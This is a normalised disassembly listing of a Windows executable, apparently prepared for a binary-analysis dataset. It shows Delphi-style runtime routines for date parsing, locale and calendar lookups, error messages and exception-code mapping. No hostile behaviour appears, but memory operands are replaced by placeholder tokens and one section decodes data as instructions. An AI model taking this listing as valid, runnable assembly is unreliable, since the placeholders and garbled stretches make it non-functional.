mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4043a8
push eax
mov eax [ ebx ]
call sub_4043a8
pop edx
call sub_40c768
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ab6c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409d0c
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40abc8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40aee3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40aa84
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c6a4
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a92c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40aad0
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404408
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407e38
mov eax [ ebp - 0x1c ]
call sub_40ab18
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aeea
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f0c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa4c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a92c
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa4c
test al al
je r-xdata
call sub_409d0c
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a92c
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409a54
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4044ec
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa4c
mov edx ebx
mov eax esi
call sub_40a908
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4041a8
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40aad0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ab6c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a908
mov eax esi
call sub_4041a8
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409d0c
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4041a8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404408
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407dc8
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4041a8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404408
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407dc8
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40af0c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a9c0
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a9c0
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a9c0
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a92c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a908
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a9c0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa4c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a92c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a9c0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa4c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a908
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_40994c
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a9c0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a92c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a9c0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa4c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a9c0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a92c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b100
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40af0c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4041a8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b134
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40abc8
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b100
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4041a8
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40af0c
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b1c0
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403fd8
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b20c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403f3c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403fd8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b258
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b280
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b20c
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405af8
sub_40b2bc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b3cf
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b280
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f3c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b280
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403f3c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b280
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403f3c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b280
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403f3c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3d6
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f0c
retn
sub_40b3e0
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4040e0
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b41c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b481
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040e0
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4080b0
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b488
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
inc ebx
sub_40b494
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b52b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b20c
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4080b0
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b532
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b3e0
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b41c
call EnumCalendarInfoA
sub_40b544
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b70e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403ee8
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b20c
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4080b0
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4041a8
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b715
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f0c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408804
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c5b4
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404408
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4041b0
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403f3c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408804
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b0
inc ebx
jmp r-xdata
mov eax esi
call sub_4041a8
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408804
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b0
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b0
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b0
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4040d0
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4041b0
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4040d0
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4041b0
sub_40b778
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b76c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c808
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408728
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405000
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4030e8
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408d60
mov eax [ ebp - 0x4 ]
call sub_4086c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4043a8
mov ebx eax
mov eax ebx
call sub_4086c4
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b900
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b778
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405000
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402a24
call sub_402844
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4086c4
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b9c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403f3c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40ba5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408da0
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba65
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
add esp 0xfffffff0
call sub_4034bc
sub_40ba65
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba84
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405af8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_40bac0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bb2c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405af8
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408da0
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb33
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
add esp 0xfffffff0
call sub_4034bc
sub_40bb33
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb80
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028b8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bbe0
in al 0xbb
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ah
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403924
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b9c8
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bb80
mov edx eax
sub_40bc54
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bcf0
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f80
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcf7
lea eax [ ebp - 0x20 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40bd44
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bddc
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bf97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
